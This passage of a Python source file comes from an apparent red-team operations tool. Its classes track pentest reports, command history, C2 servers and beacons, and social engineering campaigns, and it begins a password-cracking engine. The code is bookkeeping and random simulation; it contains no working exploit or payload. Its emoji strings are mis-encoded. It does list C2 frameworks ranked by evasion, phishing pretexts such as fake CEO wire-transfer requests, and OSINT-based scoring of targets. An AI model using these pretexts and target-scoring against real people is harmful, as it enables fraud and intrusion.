            count = stats['by_category'].get(cat_id, 0)
            lines.append(f"   {cat_info['icon']} {cat_info['name']}: {count}")
        lines.append("")
        
        # By platform
        lines.extend([
            "üíª EXPLOITS BY PLATFORM",
            "‚îÄ" * 40
        ])
        
        for platform in self.EXPLOIT_PLATFORMS:
            count = stats['by_platform'].get(platform, 0)
            if count > 0:
                lines.append(f"   ‚Ä¢ {platform.title()}: {count}")
        
        lines.extend(["", "=" * 70])
        return "\n".join(lines)


class SecureNotepad:
    """Secure notepad for sensitive operation notes."""
    
    def __init__(self):
        self.notes = {}
        self.tags = set()
        self.encryption_key = None
    
    def create_note(self, note_info: Dict[str, Any]) -> str:
        """Create a new secure note."""
        note_id = str(uuid.uuid4())[:8]
        
        self.notes[note_id] = {
            'id': note_id,
            'title': note_info.get('title', 'Untitled'),
            'content': note_info.get('content', ''),
            'tags': note_info.get('tags', []),
            'created': datetime.now().isoformat(),
            'modified': datetime.now().isoformat(),
            'locked': note_info.get('locked', False),
            'category': note_info.get('category', 'general'),
            'priority': note_info.get('priority', 'normal'),
            'attachments': [],
            'linked_exploits': [],
            'linked_targets': []
        }
        
        # Add tags
        for tag in note_info.get('tags', []):
            self.tags.add(tag)
        
        return note_id
    
    def update_note(self, note_id: str, updates: Dict[str, Any]) -> bool:
        """Update existing note."""
        if note_id not in self.notes:
            return False
        
        note = self.notes[note_id]
        
        if note.get('locked'):
            return False
        
        for key, value in updates.items():
            if key in ['title', 'content', 'tags', 'category', 'priority']:
                note[key] = value
        
        note['modified'] = datetime.now().isoformat()
        return True
    
    def search_notes(self, query: str, tags: List[str] = None) -> List[Dict[str, Any]]:
        """Search notes by content or tags."""
        query_lower = query.lower()
        results = []
        
        for note in self.notes.values():
            # Content search
            if query_lower in note['title'].lower() or query_lower in note['content'].lower():
                if not tags or any(t in note['tags'] for t in tags):
                    results.append(note)
        
        return results
    
    def get_notes_by_tag(self, tag: str) -> List[Dict[str, Any]]:
        """Get all notes with specific tag."""
        return [n for n in self.notes.values() if tag in n['tags']]
    
    def link_exploit(self, note_id: str, exploit_id: str) -> bool:
        """Link exploit to note."""
        if note_id in self.notes:
            if exploit_id not in self.notes[note_id]['linked_exploits']:
                self.notes[note_id]['linked_exploits'].append(exploit_id)
            return True
        return False
    
    def export_notes(self, note_ids: List[str] = None) -> str:
        """Export notes as formatted text."""
        notes_to_export = [self.notes[nid] for nid in (note_ids or self.notes.keys()) if nid in self.notes]
        
        lines = [
            "=" * 70,
            "üìù SECURE NOTEPAD EXPORT",
            "=" * 70,
            "",
            f"üìÖ Exported: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            f"üìã Notes: {len(notes_to_export)}",
            ""
        ]
        
        for note in notes_to_export:
            lines.extend([
                f"üìå {note['title']}",
                "‚îÄ" * 40,
                f"   Created: {note['created']}",
                f"   Tags: {', '.join(note['tags']) or 'None'}",
                f"   Priority: {note['priority']}",
                "",
                note['content'],
                "",
                "‚îÄ" * 40,
                ""
            ])
        
        return "\n".join(lines)


class ReportTemplateEngine:
    """Generate professional security reports from templates."""
    
    REPORT_TEMPLATES = {
        'executive_summary': {
            'name': 'Executive Summary',
            'sections': ['overview', 'key_findings', 'risk_summary', 'recommendations'],
            'audience': 'executives'
        },
        'technical_report': {
            'name': 'Technical Assessment',
            'sections': ['methodology', 'scope', 'findings', 'evidence', 'remediation'],
            'audience': 'technical'
        },
        'vulnerability_report': {
            'name': 'Vulnerability Assessment',
            'sections': ['summary', 'methodology', 'vulnerabilities', 'risk_matrix', 'remediation'],
            'audience': 'mixed'
        },
        'pentest_report': {
            'name': 'Penetration Test Report',
            'sections': ['executive_summary', 'scope', 'methodology', 'attack_narrative', 'findings', 'recommendations'],
            'audience': 'mixed'
        },
        'red_team_report': {
            'name': 'Red Team Assessment',
            'sections': ['executive_summary', 'objectives', 'attack_path', 'detection_analysis', 'findings', 'recommendations'],
            'audience': 'mixed'
        },
        'compliance_report': {
            'name': 'Compliance Assessment',
            'sections': ['overview', 'framework', 'controls', 'gaps', 'remediation_plan'],
            'audience': 'compliance'
        }
    }
    
    SEVERITY_RATINGS = {
        'critical': {'color': '#FF0000', 'score_range': '9.0-10.0', 'sla': '24 hours'},
        'high': {'color': '#FF6600', 'score_range': '7.0-8.9', 'sla': '7 days'},
        'medium': {'color': '#FFCC00', 'score_range': '4.0-6.9', 'sla': '30 days'},
        'low': {'color': '#00CC00', 'score_range': '0.1-3.9', 'sla': '90 days'},
        'info': {'color': '#0066CC', 'score_range': '0.0', 'sla': 'N/A'}
    }
    
    def __init__(self):
        self.reports = {}
        self.findings_cache = []
    
    def create_report(self, template_id: str, report_info: Dict[str, Any]) -> str:
        """Create new report from template."""
        template = self.REPORT_TEMPLATES.get(template_id)
        if not template:
            return None
        
        report_id = str(uuid.uuid4())[:8]
        
        self.reports[report_id] = {
            'id': report_id,
            'template': template_id,
            'template_info': template,
            'title': report_info.get('title', f'{template["name"]} Report'),
            'client': report_info.get('client'),
            'assessment_dates': report_info.get('dates', {}),
            'assessors': report_info.get('assessors', []),
            'version': '1.0',
            'status': 'draft',
            'created': datetime.now().isoformat(),
            'sections': {section: {'content': '', 'status': 'pending'} for section in template['sections']},
            'findings': [],
            'appendices': [],
            'metadata': report_info.get('metadata', {})
        }
        
        return report_id
    
    def add_finding(self, report_id: str, finding: Dict[str, Any]) -> str:
        """Add finding to report."""
        if report_id not in self.reports:
            return None
        
        finding_id = str(uuid.uuid4())[:8]
        
        finding_entry = {
            'id': finding_id,
            'title': finding.get('title'),
            'severity': finding.get('severity', 'medium'),
            'cvss': finding.get('cvss', 5.0),
            'cve': finding.get('cve'),
            'cwe': finding.get('cwe'),
            'affected_systems': finding.get('systems', []),
            'description': finding.get('description'),
            'impact': finding.get('impact'),
            'likelihood': finding.get('likelihood', 'medium'),
            'proof_of_concept': finding.get('poc'),
            'evidence': finding.get('evidence', []),
            'remediation': finding.get('remediation'),
            'references': finding.get('references', [])
        }
        
        self.reports[report_id]['findings'].append(finding_entry)
        return finding_id
    
    def update_section(self, report_id: str, section: str, content: str) -> bool:
        """Update report section content."""
        if report_id not in self.reports:
            return False
        
        report = self.reports[report_id]
        if section in report['sections']:
            report['sections'][section]['content'] = content
            report['sections'][section]['status'] = 'complete'
            return True
        return False
    
    def generate_risk_matrix(self, report_id: str) -> Dict[str, Any]:
        """Generate risk matrix from findings."""
        if report_id not in self.reports:
            return {}
        
        findings = self.reports[report_id]['findings']
        
        matrix = {
            'total': len(findings),
            'by_severity': {'critical': 0, 'high': 0, 'medium': 0, 'low': 0, 'info': 0},
            'average_cvss': 0,
            'risk_score': 0
        }
        
        cvss_sum = 0
        for finding in findings:
            sev = finding['severity']
            matrix['by_severity'][sev] = matrix['by_severity'].get(sev, 0) + 1
            cvss_sum += finding.get('cvss', 5.0)
        
        if findings:
            matrix['average_cvss'] = round(cvss_sum / len(findings), 1)
            
            # Calculate risk score
            risk = (matrix['by_severity']['critical'] * 10 + 
                   matrix['by_severity']['high'] * 7 + 
                   matrix['by_severity']['medium'] * 4 + 
                   matrix['by_severity']['low'] * 1)
            matrix['risk_score'] = min(100, risk)
        
        return matrix
    
    def generate_report_output(self, report_id: str) -> str:
        """Generate final report output."""
        if report_id not in self.reports:
            return ""
        
        report = self.reports[report_id]
        template = report['template_info']
        risk_matrix = self.generate_risk_matrix(report_id)
        
        lines = [
            "=" * 70,
            f"üìã {report['title'].upper()}",
            "=" * 70,
            "",
            f"Template: {template['name']}",
            f"Client: {report.get('client', 'N/A')}",
            f"Version: {report['version']}",
            f"Status: {report['status'].title()}",
            f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            ""
        ]
        
        # Risk summary
        lines.extend([
            "üìä RISK SUMMARY",
            "‚îÄ" * 40,
            f"   Total Findings: {risk_matrix['total']}",
            f"   üî¥ Critical: {risk_matrix['by_severity']['critical']}",
            f"   üü† High: {risk_matrix['by_severity']['high']}",
            f"   üü° Medium: {risk_matrix['by_severity']['medium']}",
            f"   üü¢ Low: {risk_matrix['by_severity']['low']}",
            f"   Average CVSS: {risk_matrix['average_cvss']}",
            f"   Risk Score: {risk_matrix['risk_score']}/100",
            ""
        ])
        
        # Sections
        for section in template['sections']:
            section_data = report['sections'].get(section, {})
            status_icon = "‚úÖ" if section_data.get('status') == 'complete' else "‚¨ú"
            lines.extend([
                f"{status_icon} {section.replace('_', ' ').upper()}",
                "‚îÄ" * 40,
                section_data.get('content', '(Content pending)'),
                ""
            ])
        
        # Top findings
        if report['findings']:
            lines.extend([
                "üîç TOP FINDINGS",
                "‚îÄ" * 40
            ])
            
            sorted_findings = sorted(report['findings'], 
                                   key=lambda x: {'critical': 0, 'high': 1, 'medium': 2, 'low': 3, 'info': 4}.get(x['severity'], 5))
            
            for finding in sorted_findings[:10]:
                sev_icon = {'critical': 'üî¥', 'high': 'üü†', 'medium': 'üü°', 'low': 'üü¢', 'info': 'üîµ'}.get(finding['severity'], '‚ö™')
                lines.append(f"   {sev_icon} {finding['title']}")
                lines.append(f"      CVSS: {finding['cvss']} | Systems: {len(finding['affected_systems'])}")
        
        lines.extend(["", "=" * 70])
        return "\n".join(lines)


class CommandHistoryManager:
    """Manage and replay command history."""
    
    COMMAND_CATEGORIES = {
        'recon': {'icon': 'üîç', 'name': 'Reconnaissance'},
        'scan': {'icon': 'üì°', 'name': 'Scanning'},
        'exploit': {'icon': 'üéØ', 'name': 'Exploitation'},
        'post': {'icon': 'üîì', 'name': 'Post-Exploitation'},
        'pivot': {'icon': '‚ÜîÔ∏è', 'name': 'Pivoting'},
        'exfil': {'icon': 'üì§', 'name': 'Exfiltration'},
        'persist': {'icon': 'üîó', 'name': 'Persistence'},
        'clean': {'icon': 'üßπ', 'name': 'Cleanup'}
    }
    
    def __init__(self):
        self.commands = []
        self.sessions = {}
        self.macros = {}
        self.favorites = []
    
    def log_command(self, cmd_info: Dict[str, Any]) -> str:
        """Log executed command."""
        cmd_id = str(uuid.uuid4())[:8]
        
        command = {
            'id': cmd_id,
            'command': cmd_info.get('command'),
            'category': cmd_info.get('category', 'recon'),
            'target': cmd_info.get('target'),
            'session': cmd_info.get('session'),
            'timestamp': datetime.now().isoformat(),
            'output': cmd_info.get('output'),
            'success': cmd_info.get('success', True),
            'duration_ms': cmd_info.get('duration', 0),
            'notes': cmd_info.get('notes', '')
        }
        
        self.commands.append(command)
        
        # Add to session if specified
        session_id = cmd_info.get('session')
        if session_id:
            if session_id not in self.sessions:
                self.sessions[session_id] = []
            self.sessions[session_id].append(cmd_id)
        
        return cmd_id
    
    def create_macro(self, macro_info: Dict[str, Any]) -> str:
        """Create reusable command macro."""
        macro_id = str(uuid.uuid4())[:8]
        
        self.macros[macro_id] = {
            'id': macro_id,
            'name': macro_info.get('name'),
            'description': macro_info.get('description', ''),
            'commands': macro_info.get('commands', []),
            'variables': macro_info.get('variables', {}),
            'category': macro_info.get('category', 'recon'),
            'created': datetime.now().isoformat()
        }
        
        return macro_id
    
    def replay_commands(self, cmd_ids: List[str]) -> List[Dict[str, Any]]:
        """Replay specific commands."""
        replay_results = []
        
        for cmd_id in cmd_ids:
            cmd = next((c for c in self.commands if c['id'] == cmd_id), None)
            if cmd:
                replay_results.append({
                    'original_id': cmd_id,
                    'command': cmd['command'],
                    'replay_time': datetime.now().isoformat(),
                    'status': 'queued'
                })
        
        return replay_results
    
    def search_commands(self, query: str = None, category: str = None, 
                       target: str = None) -> List[Dict[str, Any]]:
        """Search command history."""
        results = self.commands.copy()
        
        if query:
            query_lower = query.lower()
            results = [c for c in results if query_lower in c['command'].lower()]
        
        if category:
            results = [c for c in results if c['category'] == category]
        
        if target:
            results = [c for c in results if c.get('target') == target]
        
        return results
    
    def get_session_commands(self, session_id: str) -> List[Dict[str, Any]]:
        """Get all commands from a session."""
        cmd_ids = self.sessions.get(session_id, [])
        return [c for c in self.commands if c['id'] in cmd_ids]
    
    def generate_history_report(self) -> str:
        """Generate command history report."""
        lines = [
            "=" * 70,
            "üìú COMMAND HISTORY REPORT",
            "=" * 70,
            "",
            f"üìÖ Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            f"üìã Total Commands: {len(self.commands)}",
            f"üìÅ Sessions: {len(self.sessions)}",
            f"üîÑ Macros: {len(self.macros)}",
            ""
        ]
        
        # Commands by category
        lines.extend([
            "üìä COMMANDS BY CATEGORY",
            "‚îÄ" * 40
        ])
        
        cat_counts = {}
        for cmd in self.commands:
            cat = cmd['category']
            cat_counts[cat] = cat_counts.get(cat, 0) + 1
        
        for cat_id, cat_info in self.COMMAND_CATEGORIES.items():
            count = cat_counts.get(cat_id, 0)
            lines.append(f"   {cat_info['icon']} {cat_info['name']}: {count}")
        lines.append("")
        
        # Recent commands
        lines.extend([
            "üìú RECENT COMMANDS",
            "‚îÄ" * 40
        ])
        
        for cmd in self.commands[-10:]:
            cat_info = self.COMMAND_CATEGORIES.get(cmd['category'], {'icon': '‚ùì'})
            status = "‚úÖ" if cmd['success'] else "‚ùå"
            lines.append(f"   {status} {cat_info['icon']} {cmd['command'][:50]}...")
        
        # Macros
        if self.macros:
            lines.extend([
                "",
                "üîÑ SAVED MACROS",
                "‚îÄ" * 40
            ])
            for macro_id, macro in self.macros.items():
                lines.append(f"   üì¶ {macro['name']} ({len(macro['commands'])} commands)")
        
        lines.extend(["", "=" * 70])
        return "\n".join(lines)


class C2InfrastructureManager:
    """Manage Command and Control infrastructure."""
    
    C2_FRAMEWORKS = {
        'cobalt_strike': {
            'name': 'Cobalt Strike',
            'type': 'commercial',
            'protocols': ['http', 'https', 'dns', 'smb'],
            'evasion': 'high',
            'features': ['beacon', 'malleable_c2', 'aggressor_scripts']
        },
        'metasploit': {
            'name': 'Metasploit Framework',
            'type': 'open_source',
            'protocols': ['http', 'https', 'tcp', 'reverse_tcp'],
            'evasion': 'medium',
            'features': ['meterpreter', 'post_modules', 'pivoting']
        },
        'empire': {
            'name': 'PowerShell Empire',
            'type': 'open_source',
            'protocols': ['http', 'https'],
            'evasion': 'medium',
            'features': ['powershell', 'python', 'modules']
        },
        'covenant': {
            'name': 'Covenant',
            'type': 'open_source',
            'protocols': ['http', 'https', 'bridge'],
            'evasion': 'medium',
            'features': ['grunt', 'tasks', 'graphs']
        },
        'sliver': {
            'name': 'Sliver',
            'type': 'open_source',
            'protocols': ['http', 'https', 'mtls', 'dns', 'wg'],
            'evasion': 'high',
            'features': ['implants', 'armory', 'multiplayer']
        },
        'mythic': {
            'name': 'Mythic',
            'type': 'open_source',
            'protocols': ['http', 'https', 'websocket'],
            'evasion': 'high',
            'features': ['agents', 'c2_profiles', 'docker']
        },
        'havoc': {
            'name': 'Havoc',
            'type': 'open_source',
            'protocols': ['http', 'https', 'smb'],
            'evasion': 'high',
            'features': ['demon', 'teamserver', 'python_api']
        },
        'brute_ratel': {
            'name': 'Brute Ratel C4',
            'type': 'commercial',
            'protocols': ['http', 'https', 'dns', 'smb', 'doh'],
            'evasion': 'very_high',
            'features': ['badger', 'edr_evasion', 'syscalls']
        }
    }
    
    LISTENER_TYPES = {
        'http': {'port_default': 80, 'encrypted': False},
        'https': {'port_default': 443, 'encrypted': True},
        'dns': {'port_default': 53, 'encrypted': False},
        'smb': {'port_default': 445, 'encrypted': False},
        'tcp': {'port_default': 4444, 'encrypted': False}
    }
    
    def __init__(self):
        self.infrastructure = {}
        self.listeners = []
        self.redirectors = []
        self.domains = []
        self.agents = []
    
    def add_server(self, server_info: Dict[str, Any]) -> str:
        """Add C2 server to infrastructure."""
        server_id = str(uuid.uuid4())[:8]
        
        self.infrastructure[server_id] = {
            'id': server_id,
            'name': server_info.get('name', f'C2-{server_id}'),
            'ip': server_info.get('ip'),
            'hostname': server_info.get('hostname'),
            'framework': server_info.get('framework', 'cobalt_strike'),
            'role': server_info.get('role', 'teamserver'),
            'status': 'offline',
            'listeners': [],
            'agents_connected': 0,
            'last_seen': None,
            'ssl_cert': server_info.get('ssl_cert'),
            'cloud_provider': server_info.get('provider'),
            'notes': server_info.get('notes', '')
        }
        
        return server_id
    
    def add_listener(self, listener_info: Dict[str, Any]) -> str:
        """Add listener to infrastructure."""
        listener_id = str(uuid.uuid4())[:8]
        
        listener_type = listener_info.get('type', 'https')
        type_info = self.LISTENER_TYPES.get(listener_type, self.LISTENER_TYPES['https'])
        
        listener = {
            'id': listener_id,
            'name': listener_info.get('name', f'Listener-{listener_id}'),
            'type': listener_type,
            'port': listener_info.get('port', type_info['port_default']),
            'host': listener_info.get('host'),
            'server_id': listener_info.get('server_id'),
            'status': 'stopped',
            'profile': listener_info.get('profile'),
            'ssl': type_info['encrypted'],
            'created': datetime.now().isoformat(),
            'callbacks': 0
        }
        
        self.listeners.append(listener)
        
        # Link to server
        server_id = listener_info.get('server_id')
        if server_id in self.infrastructure:
            self.infrastructure[server_id]['listeners'].append(listener_id)
        
        return listener_id
    
    def add_redirector(self, redirector_info: Dict[str, Any]) -> str:
        """Add traffic redirector."""
        redirector_id = str(uuid.uuid4())[:8]
        
        self.redirectors.append({
            'id': redirector_id,
            'name': redirector_info.get('name', f'Redir-{redirector_id}'),
            'ip': redirector_info.get('ip'),
            'type': redirector_info.get('type', 'apache'),
            'target_server': redirector_info.get('target'),
            'domains': redirector_info.get('domains', []),
            'rules': redirector_info.get('rules', []),
            'status': 'offline',
            'cloud_provider': redirector_info.get('provider')
        })
        
        return redirector_id
    
    def add_domain(self, domain_info: Dict[str, Any]) -> str:
        """Add domain to infrastructure."""
        domain_id = str(uuid.uuid4())[:8]
        
        self.domains.append({
            'id': domain_id,
            'domain': domain_info.get('domain'),
            'registrar': domain_info.get('registrar'),
            'categorization': domain_info.get('category', 'uncategorized'),
            'reputation': domain_info.get('reputation', 'neutral'),
            'age_days': domain_info.get('age', 0),
            'ssl_cert': domain_info.get('ssl'),
            'linked_redirector': domain_info.get('redirector'),
            'status': 'active'
        })
        
        return domain_id
    
    def register_agent(self, agent_info: Dict[str, Any]) -> str:
        """Register new agent/beacon."""
        agent_id = str(uuid.uuid4())[:8]
        
        self.agents.append({
            'id': agent_id,
            'hostname': agent_info.get('hostname'),
            'ip': agent_info.get('ip'),
            'username': agent_info.get('username'),
            'os': agent_info.get('os'),
            'arch': agent_info.get('arch', 'x64'),
            'listener_id': agent_info.get('listener'),
            'first_seen': datetime.now().isoformat(),
            'last_seen': datetime.now().isoformat(),
            'status': 'active',
            'integrity': agent_info.get('integrity', 'medium'),
            'pid': agent_info.get('pid'),
            'sleep': agent_info.get('sleep', 60),
            'jitter': agent_info.get('jitter', 10)
        })
        
        return agent_id
    
    def generate_infrastructure_report(self) -> str:
        """Generate C2 infrastructure report."""
        lines = [
            "=" * 70,
            "üì° C2 INFRASTRUCTURE REPORT",
            "=" * 70,
            "",
            f"üìÖ Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            f"üñ•Ô∏è Servers: {len(self.infrastructure)}",
            f"üìª Listeners: {len(self.listeners)}",
            f"üîÄ Redirectors: {len(self.redirectors)}",
            f"üåê Domains: {len(self.domains)}",
            f"ü§ñ Agents: {len(self.agents)}",
            ""
        ]
        
        # C2 Frameworks reference
        lines.extend([
            "üõ†Ô∏è SUPPORTED FRAMEWORKS",
            "‚îÄ" * 40
        ])
        
        for fw_id, fw_info in self.C2_FRAMEWORKS.items():
            evasion_icon = {'low': 'üü¢', 'medium': 'üü°', 'high': 'üü†', 'very_high': 'üî¥'}.get(fw_info['evasion'], '‚ö™')
            lines.append(f"   {evasion_icon} {fw_info['name']} ({fw_info['type']})")
        lines.append("")
        
        # Servers
        if self.infrastructure:
            lines.extend([
                "üñ•Ô∏è C2 SERVERS",
                "‚îÄ" * 40
            ])
            for server_id, server in self.infrastructure.items():
                status_icon = "üü¢" if server['status'] == 'online' else "üî¥"
                lines.append(f"   {status_icon} {server['name']} ({server['framework']})")
                lines.append(f"      IP: {server['ip']} | Listeners: {len(server['listeners'])}")
            lines.append("")
        
        # Active agents
        if self.agents:
            lines.extend([
                "ü§ñ ACTIVE AGENTS",
                "‚îÄ" * 40
            ])
            for agent in self.agents[:10]:
                status_icon = "üü¢" if agent['status'] == 'active' else "üî¥"
                lines.append(f"   {status_icon} {agent['hostname']} ({agent['username']})")
                lines.append(f"      OS: {agent['os']} | Sleep: {agent['sleep']}s")
        
        lines.extend(["", "=" * 70])
        return "\n".join(lines)


class SocialEngineeringToolkit:
    """Social engineering attack toolkit."""
    
    ATTACK_VECTORS = {
        'phishing': {
            'name': 'Phishing',
            'icon': 'üé£',
            'description': 'Email-based credential harvesting',
            'success_rate': 0.35
        },
        'spear_phishing': {
            'name': 'Spear Phishing',
            'icon': 'üéØ',
            'description': 'Targeted phishing with personalization',
            'success_rate': 0.55
        },
        'vishing': {
            'name': 'Vishing',
            'icon': 'üìû',
            'description': 'Voice-based social engineering',
            'success_rate': 0.40
        },
        'smishing': {
            'name': 'Smishing',
            'icon': 'üì±',
            'description': 'SMS-based phishing',
            'success_rate': 0.25
        },
        'pretexting': {
            'name': 'Pretexting',
            'icon': 'üé≠',
            'description': 'Fabricated scenario manipulation',
            'success_rate': 0.45
        },
        'baiting': {
            'name': 'Baiting',
            'icon': 'ü™§',
            'description': 'Physical or digital bait drops',
            'success_rate': 0.30
        },
        'tailgating': {
            'name': 'Tailgating',
            'icon': 'üö™',
            'description': 'Physical access following',
            'success_rate': 0.60
        },
        'quid_pro_quo': {
            'name': 'Quid Pro Quo',
            'icon': 'ü§ù',
            'description': 'Service exchange manipulation',
            'success_rate': 0.35
        },
        'watering_hole': {
            'name': 'Watering Hole',
            'icon': 'üåä',
            'description': 'Compromise frequently visited sites',
            'success_rate': 0.25
        },
        'usb_drop': {
            'name': 'USB Drop',
            'icon': 'üíæ',
            'description': 'Malicious USB device placement',
            'success_rate': 0.45
        }
    }
    
    PRETEXT_SCENARIOS = {
        'it_support': 'IT Support requesting password verification',
        'hr_update': 'HR requesting employee information update',
        'ceo_urgent': 'CEO with urgent wire transfer request',
        'vendor': 'Vendor requesting payment information update',
        'survey': 'Market research survey with incentive',
        'job_offer': 'Recruiter with job opportunity',
        'delivery': 'Package delivery confirmation required',
        'bank': 'Bank fraud alert verification',
        'irs': 'Tax authority audit notification',
        'tech_support': 'Microsoft/Apple security alert'
    }
    
    def __init__(self):
        self.campaigns = {}
        self.targets = []
        self.pretext_library = dict(self.PRETEXT_SCENARIOS)
        self.osint_data = {}
    
    def create_campaign(self, campaign_info: Dict[str, Any]) -> str:
        """Create social engineering campaign."""
        campaign_id = str(uuid.uuid4())[:8]
        
        vector = campaign_info.get('vector', 'phishing')
        vector_info = self.ATTACK_VECTORS.get(vector, self.ATTACK_VECTORS['phishing'])
        
        self.campaigns[campaign_id] = {
            'id': campaign_id,
            'name': campaign_info.get('name', f'SE-Campaign-{campaign_id}'),
            'vector': vector,
            'vector_info': vector_info,
            'pretext': campaign_info.get('pretext'),
            'targets': [],
            'status': 'planning',
            'created': datetime.now().isoformat(),
            'results': {
                'contacted': 0,
                'responded': 0,
                'clicked': 0,
                'compromised': 0,
                'reported': 0
            },
            'notes': campaign_info.get('notes', '')
        }
        
        return campaign_id
    
    def add_target(self, campaign_id: str, target_info: Dict[str, Any]) -> str:
        """Add target to campaign with OSINT data."""
        if campaign_id not in self.campaigns:
            return None
        
        target_id = str(uuid.uuid4())[:8]
        
        target = {
            'id': target_id,
            'name': target_info.get('name'),
            'email': target_info.get('email'),
            'phone': target_info.get('phone'),
            'title': target_info.get('title'),
            'department': target_info.get('department'),
            'company': target_info.get('company'),
            'linkedin': target_info.get('linkedin'),
            'osint': {
                'social_media': target_info.get('social_media', []),
                'interests': target_info.get('interests', []),
                'recent_posts': target_info.get('posts', []),
                'connections': target_info.get('connections', [])
            },
            'vulnerability_score': self._calculate_vulnerability(target_info),
            'status': 'identified',
            'events': []
        }
        
        self.campaigns[campaign_id]['targets'].append(target)
        self.targets.append(target)
        
        return target_id
    
    def _calculate_vulnerability(self, target_info: Dict) -> float:
        """Calculate target vulnerability to social engineering."""
        score = 50.0  # Base score
        
        # Social media presence increases vulnerability
        if target_info.get('social_media'):
            score += len(target_info['social_media']) * 5
        
        # Interests reveal personalization opportunities
        if target_info.get('interests'):
            score += len(target_info['interests']) * 3
        
        # Public contact info
        if target_info.get('email'):
            score += 10
        if target_info.get('phone'):
            score += 15
        
        # Job title (executives more targeted)
        title = target_info.get('title', '').lower()
        if any(t in title for t in ['ceo', 'cfo', 'cto', 'vp', 'director']):
            score += 20
        
        return min(100, score)
    
    def simulate_attack(self, campaign_id: str) -> Dict[str, Any]:
        """Simulate social engineering attack."""
        if campaign_id not in self.campaigns:
            return {'error': 'Campaign not found'}
        
        campaign = self.campaigns[campaign_id]
        vector_info = campaign['vector_info']
        
        results = {
            'campaign_id': campaign_id,
            'vector': campaign['vector'],
            'targets': len(campaign['targets']),
            'events': []
        }
        
        for target in campaign['targets']:
            # Contact attempt
            campaign['results']['contacted'] += 1
            target['events'].append({'type': 'contacted', 'time': datetime.now().isoformat()})
            
            # Response based on vulnerability and vector success rate
            response_chance = (target['vulnerability_score'] / 100) * vector_info['success_rate'] * 1.5
            
            if random.random() < response_chance:
                campaign['results']['responded'] += 1
                target['events'].append({'type': 'responded', 'time': datetime.now().isoformat()})
                
                # Click/action
                if random.random() < 0.7:
                    campaign['results']['clicked'] += 1
                    target['events'].append({'type': 'clicked', 'time': datetime.now().isoformat()})
                    
                    # Compromise
                    if random.random() < 0.5:
                        campaign['results']['compromised'] += 1
                        target['events'].append({'type': 'compromised', 'time': datetime.now().isoformat()})
            
            # Report (low chance)
            if random.random() < 0.08:
                campaign['results']['reported'] += 1
        
        campaign['status'] = 'completed'
        results['summary'] = campaign['results']
        
        return results
    
    def generate_se_report(self) -> str:
        """Generate social engineering report."""
        lines = [
            "=" * 70,
            "üé≠ SOCIAL ENGINEERING TOOLKIT REPORT",
            "=" * 70,
            "",
            f"üìÖ Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            f"üìã Campaigns: {len(self.campaigns)}",
            f"üéØ Total Targets: {len(self.targets)}",
            ""
        ]
        
        # Attack vectors
        lines.extend([
            "‚öîÔ∏è ATTACK VECTORS",
            "‚îÄ" * 40
        ])
        
        for vector_id, vector_info in self.ATTACK_VECTORS.items():
            lines.append(f"   {vector_info['icon']} {vector_info['name']}")
            lines.append(f"      {vector_info['description']}")
            lines.append(f"      Avg Success Rate: {vector_info['success_rate']*100:.0f}%")
        lines.append("")
        
        # Campaign results
        for campaign_id, campaign in self.campaigns.items():
            if campaign['status'] == 'completed':
                lines.extend([
                    f"üìä CAMPAIGN: {campaign['name']}",
                    "‚îÄ" * 40,
                    f"   Vector: {campaign['vector_info']['name']}",
                    f"   Targets: {len(campaign['targets'])}",
                    f"   üì® Contacted: {campaign['results']['contacted']}",
                    f"   üí¨ Responded: {campaign['results']['responded']}",
                    f"   üñ±Ô∏è Clicked: {campaign['results']['clicked']}",
                    f"   üíÄ Compromised: {campaign['results']['compromised']}",
                    f"   üö® Reported: {campaign['results']['reported']}",
                    ""
                ])
        
        lines.extend(["", "=" * 70])
        return "\n".join(lines)


class PasswordCrackingEngine:
    """Password cracking and analysis engine."""
    
    ATTACK_MODES = {
        'dictionary': {
            'name': 'Dictionary Attack',
            'description': 'Try words from wordlist',
            'speed': 'fast',
            'effectiveness': 'medium'
        },
        'brute_force': {
            'name': 'Brute Force',
            'description': 'Try all combinations',
            'speed': 'very_slow',
            'effectiveness': 'high'
        },
        'hybrid': {
            'name': 'Hybrid Attack',
            'description': 'Dictionary + rules',
            'speed': 'medium',
            'effectiveness': 'high'
        },
        'rule_based': {
            'name': 'Rule-Based',
            'description': 'Apply transformation rules',
            'speed': 'fast',
            'effectiveness': 'medium'
        },
        'mask': {
            'name': 'Mask Attack',
            'description': 'Pattern-based generation',
            'speed': 'medium',
            'effectiveness': 'medium'
        },
        'combinator': {
            'name': 'Combinator',
            'description': 'Combine multiple wordlists',
            'speed': 'slow',
            'effectiveness': 'medium'
        },
        'rainbow_table': {
            'name': 'Rainbow Table',
            'description': 'Pre-computed hash lookup',
            'speed': 'instant',
            'effectiveness': 'limited'
        }
    }
    
    HASH_TYPES = {
        'md5': {'name': 'MD5', 'length': 32, 'security': 'weak'},
        'sha1': {'name': 'SHA-1', 'length': 40, 'security': 'weak'},
        'sha256': {'name': 'SHA-256', 'length': 64, 'security': 'medium'},
        'sha512': {'name': 'SHA-512', 'length': 128, 'security': 'strong'},
        'ntlm': {'name': 'NTLM', 'length': 32, 'security': 'weak'},
        'bcrypt': {'name': 'bcrypt', 'length': 60, 'security': 'strong'},
        'scrypt': {'name': 'scrypt', 'length': 'variable', 'security': 'strong'},
        'argon2': {'name': 'Argon2', 'length': 'variable', 'security': 'very_strong'},
        'kerberos': {'name': 'Kerberos', 'length': 'variable', 'security': 'medium'},
        'mysql': {'name': 'MySQL', 'length': 41, 'security': 'weak'}
    }
    
    COMMON_PATTERNS = [
        r'^[A-Z][a-z]+\d{2,4}$',  # Word + numbers
        r'^[a-z]+\d{1,4}[!@#$]?$',  # lowercase + numbers + special
        r'^[A-Z][a-z]+[!@#$]\d{2,4}$',  # Capital word + special + numbers
        r'^\d{6,8}$',  # Numbers only
        r'^[a-z]{3,6}\d{4}$',  # Short word + year
    ]
    
    def __init__(self):
        self.hash_queue = []
        self.cracked = {}
        self.wordlists = []
        self.rules = []
        self.statistics = {
            'total_attempts': 0,
            'successful': 0,
            'failed': 0
        }
    
    def add_hash(self, hash_info: Dict[str, Any]) -> str:
        """Add hash to cracking queue."""
        hash_id = str(uuid.uuid4())[:8]
        
        hash_type = self._identify_hash_type(hash_info.get('hash', ''))
        
        self.hash_queue.append({
            'id': hash_id,
